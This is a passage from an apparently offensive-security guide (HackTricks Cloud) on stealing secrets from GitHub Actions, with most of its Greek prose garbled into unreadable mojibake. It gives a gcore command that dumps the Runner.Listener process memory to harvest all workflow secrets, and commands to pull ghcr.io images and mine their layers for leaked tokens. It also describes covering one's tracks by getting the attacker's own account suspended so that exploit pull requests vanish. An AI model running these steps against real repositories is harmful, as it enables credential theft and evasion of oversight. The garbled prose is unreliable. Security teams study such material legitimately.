Ï„Î±Ï…Ï„ÏŒÏ‡ÏÎ¿Î½Î±** ÎºÎ±Î¹ Î· ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î· Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **ÎºÎ»Î­ÏˆÎµÎ¹ Ï„Î± Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬** Ï„Î·Ï‚ Î¬Î»Î»Î·Ï‚.

Î£Îµ Î±Ï…Ï„Î¿Ï†Î¹Î»Î¿Î¾ÎµÎ½Î¿ÏÎ¼ÎµÎ½Î¿Ï…Ï‚ ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„Î­Ï‚ ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î±Ï€Î¿ÎºÏ„Î·Î¸Î¿ÏÎ½ Ï„Î± **Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ Î±Ï€ÏŒ Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± \_Runner.Listener**\_\*\* Ï€Î¿Ï… Î¸Î± Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ ÏŒÎ»Î± Ï„Î± Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ Ï„Ï‰Î½ ÏÎ¿ÏÎ½ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚ ÏƒÎµ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Î²Î®Î¼Î±, ÎµÎºÏ‡Ï…Î»Î¯Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î· Î¼Î½Î®Î¼Î· Ï„Î·Ï‚: 

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Î”ÎµÎ¯Ï„Îµ [**Î±Ï…Ï„Î® Ï„Î·Î½ Î±Î½Î¬ÏÏ„Î·ÏƒÎ· Î³Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Github actions Ï€Î¿Ï… Î¸Î± **ÎºÎ±Ï„Î±ÏƒÎºÎµÏ…Î¬ÏƒÎ¿Ï…Î½ ÎºÎ±Î¹ Î¸Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏÏƒÎ¿Ï…Î½ Î¼Î¹Î± ÎµÎ¹ÎºÏŒÎ½Î± Docker Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ Github**.\
ÎˆÎ½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²ÏÎµÎ¸ÎµÎ¯ ÏƒÏ„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÏ€ÎµÎºÏ„Î¬ÏƒÎ¹Î¼Î· ÎµÎ½ÏŒÏ„Î·Ï„Î±:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

ÎŒÏ€Ï‰Ï‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿ ÎºÏÎ´Î¹ÎºÎ±, Ï„Î¿ Github registry Ï†Î¹Î»Î¿Î¾ÎµÎ½ÎµÎ¯Ï„Î±Î¹ ÏƒÏ„Î¿ **`ghcr.io`**.

ÎˆÎ½Î±Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¼Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î±Î½Î¬Î³Î½Ï‰ÏƒÎ·Ï‚ Ï€Î¬Î½Ï‰ ÏƒÏ„Î¿ repo Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÎ¹ Ï„Î·Î½ ÎµÎ¹ÎºÏŒÎ½Î± Docker Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î± Ï€ÏÎ¿ÏƒÏ‰Ï€Î¹ÎºÏŒ Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Then, the user could search for **leaked secrets in the Docker image layers:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Î•Ï…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ„Î± Î±ÏÏ‡ÎµÎ¯Î± ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î®Ï‚ Ï„Î¿Ï… Github Actions

Î‘ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Î±Î½ Ï„Î¿ **Github** Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯ Î½Î± **Î±Î½Î¹Ï‡Î½ÎµÏÏƒÎµÎ¹ Î¼Ï…ÏƒÏ„Î¹ÎºÎ­Ï‚ Ï„Î¹Î¼Î­Ï‚** ÏƒÏ„Î± Î±ÏÏ‡ÎµÎ¯Î± ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î®Ï‚ Ï„Ï‰Î½ ÎµÎ½ÎµÏÎ³ÎµÎ¹ÏÎ½ ÎºÎ±Î¹ **Î½Î± Ï„Î¹Ï‚ Î±Ï€Î¿Ï†ÏÎ³ÎµÎ¹**, **Î¬Î»Î»Î± ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±** Ï€Î¿Ï… Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î½ Î½Î± Î­Ï‡Î¿Ï…Î½ Ï€Î±ÏÎ±Ï‡Î¸ÎµÎ¯ ÎºÎ±Ï„Î¬ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î·Ï‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹Î±Ï‚ Î´ÎµÎ½ Î¸Î± ÎºÏÏ…Ï†Ï„Î¿ÏÎ½. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î­Î½Î± JWT Ï…Ï€Î¿Î³ÎµÎ³ÏÎ±Î¼Î¼Î­Î½Î¿ Î¼Îµ Î¼Î¹Î± Î¼Ï…ÏƒÏ„Î¹ÎºÎ® Ï„Î¹Î¼Î® Î´ÎµÎ½ Î¸Î± ÎºÏÏ…Ï†Ï„ÎµÎ¯ ÎµÎºÏ„ÏŒÏ‚ Î±Î½ ÎµÎ¯Î½Î±Î¹ [ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î± ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î¿](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## ÎšÎ±Î»ÏÏ€Ï„Î¿Î½Ï„Î±Ï‚ Ï„Î± ÎŠÏ‡Î½Î· ÏƒÎ±Ï‚

(Î¤ÎµÏ‡Î½Î¹ÎºÎ® Î±Ï€ÏŒ [**ÎµÎ´Ï**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Î ÏÏÏ„Î± Î±Ï€' ÏŒÎ»Î±, Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ PR Ï…Ï€Î¿Î²Î»Î·Î¸ÎµÎ¯ ÎµÎ¯Î½Î±Î¹ ÏƒÎ±Ï†ÏÏ‚ Î¿ÏÎ±Ï„ÏŒ ÏƒÏ„Î¿ ÎºÎ¿Î¹Î½ÏŒ ÏƒÏ„Î¿ Github ÎºÎ±Î¹ ÏƒÏ„Î¿Î½ ÏƒÏ„Î¿Ï‡Î¿Î¸ÎµÏ„Î·Î¼Î­Î½Î¿ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ GitHub. Î£Ï„Î¿ GitHub Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, **Î´ÎµÎ½ Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Î´Î¹Î±Î³ÏÎ¬ÏˆÎ¿Ï…Î¼Îµ Î­Î½Î± PR Î±Ï€ÏŒ Ï„Î¿ Î´Î¹Î±Î´Î¯ÎºÏ„Ï…Î¿**, Î±Î»Î»Î¬ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î¼Î¹Î± Î±Î½Î±Ï„ÏÎ¿Ï€Î®. Î“Î¹Î± Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿ÏÏ‚ Github Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ **Î±Î½Î±ÏƒÏ„Î±Î»Î¼Î­Î½Î¿Î¹** Î±Ï€ÏŒ Ï„Î¿ Github, ÏŒÎ»Î± Ï„Î± **PRs Ï„Î¿Ï…Ï‚ Î´Î¹Î±Î³ÏÎ¬Ï†Î¿Î½Ï„Î±Î¹ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î±** ÎºÎ±Î¹ Î±Ï†Î±Î¹ÏÎ¿ÏÎ½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ Î´Î¹Î±Î´Î¯ÎºÏ„Ï…Î¿. ÎˆÏ„ÏƒÎ¹, Î³Î¹Î± Î½Î± ÎºÏÏÏˆÎµÏ„Îµ Ï„Î· Î´ÏÎ±ÏƒÏ„Î·ÏÎ¹ÏŒÏ„Î·Ï„Î¬ ÏƒÎ±Ï‚, Ï€ÏÎ­Ï€ÎµÎ¹ ÎµÎ¯Ï„Îµ Î½Î± Ï€Î¬ÏÎµÏ„Îµ Ï„Î¿Î½ **Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ GitHub ÏƒÎ±Ï‚ Î±Î½Î±ÏƒÏ„Î±Î»Î¼Î­Î½Î¿ ÎµÎ¯Ï„Îµ Î½Î± ÏƒÎ·Î¼Î±Î´ÎµÏ…Ï„ÎµÎ¯ Î¿ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒÏ‚ ÏƒÎ±Ï‚**. Î‘Ï…Ï„ÏŒ Î¸Î± **ÎºÏÏÏˆÎµÎ¹ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Î´ÏÎ±ÏƒÏ„Î·ÏÎ¹ÏŒÏ„Î·Ï„Î­Ï‚ ÏƒÎ±Ï‚** ÏƒÏ„Î¿ GitHub Î±Ï€ÏŒ Ï„Î¿ Î´Î¹Î±Î´Î¯ÎºÏ„Ï…Î¿ (Î²Î±ÏƒÎ¹ÎºÎ¬ Î¸Î± Î±Ï†Î±Î¹ÏÎ­ÏƒÎµÎ¹ ÏŒÎ»Î± Ï„Î± exploit PR ÏƒÎ±Ï‚)

ÎœÎ¹Î± Î¿ÏÎ³Î¬Î½Ï‰ÏƒÎ· ÏƒÏ„Î¿ GitHub ÎµÎ¯Î½Î±Î¹ Ï€Î¿Î»Ï Ï€ÏÎ¿Î»Î·Ï€Ï„Î¹ÎºÎ® ÏƒÏ„Î·Î½ Î±Î½Î±Ï†Î¿ÏÎ¬ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏÎ½ ÏƒÏ„Î¿ GitHub. Î¤Î¿ Î¼ÏŒÎ½Î¿ Ï€Î¿Ï… Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ ÎµÎ¯Î½Î±Î¹ Î½Î± Î¼Î¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ â€œÎ¼ÎµÏÎ¹ÎºÎ¬ Ï€ÏÎ¬Î³Î¼Î±Ï„Î±â€ ÏƒÎµ Î­Î½Î± Issue ÎºÎ±Î¹ Î¸Î± Ï†ÏÎ¿Î½Ï„Î¯ÏƒÎ¿Ï…Î½ Î½Î± Î±Î½Î±ÏƒÏ„Î±Î»ÎµÎ¯ Î¿ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒÏ‚ ÏƒÎ±Ï‚ ÏƒÎµ 12 ÏÏÎµÏ‚ :p ÎºÎ±Î¹ ÎµÎºÎµÎ¯ Ï„Î¿ Î­Ï‡ÎµÏ„Îµ, ÎºÎ¬Î½Î±Ï„Îµ Ï„Î¿ exploit ÏƒÎ±Ï‚ Î±ÏŒÏÎ±Ï„Î¿ ÏƒÏ„Î¿ github.

{% hint style="warning" %}
ÎŸ Î¼ÏŒÎ½Î¿Ï‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î³Î¹Î± Î¼Î¹Î± Î¿ÏÎ³Î¬Î½Ï‰ÏƒÎ· Î½Î± ÎºÎ±Ï„Î±Î»Î¬Î²ÎµÎ¹ ÏŒÏ„Î¹ Î­Ï‡ÎµÎ¹ ÏƒÏ„Î¿Ï‡Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ ÎµÎ¯Î½Î±Î¹ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ Ï„Î± Î±ÏÏ‡ÎµÎ¯Î± ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î®Ï‚ Ï„Î¿Ï… GitHub Î±Ï€ÏŒ Ï„Î¿ SIEM, ÎºÎ±Î¸ÏÏ‚ Î±Ï€ÏŒ Ï„Î¿ UI Ï„Î¿Ï… GitHub Ï„Î¿ PR Î¸Î± Î­Ï‡ÎµÎ¹ Î±Ï†Î±Î¹ÏÎµÎ¸ÎµÎ¯.
{% endhint %}

## Î•ÏÎ³Î±Î»ÎµÎ¯Î±

Î¤Î± Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÏÎ³Î±Î»ÎµÎ¯Î± ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼Î± Î³Î¹Î± Î½Î± Î²ÏÎµÎ¯Ï„Îµ ÏÎ¿Î­Ï‚ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚ Github Action ÎºÎ±Î¹ Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ Î½Î± Î²ÏÎµÎ¯Ï„Îµ ÎµÏ…Î¬Î»Ï‰Ï„ÎµÏ‚:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
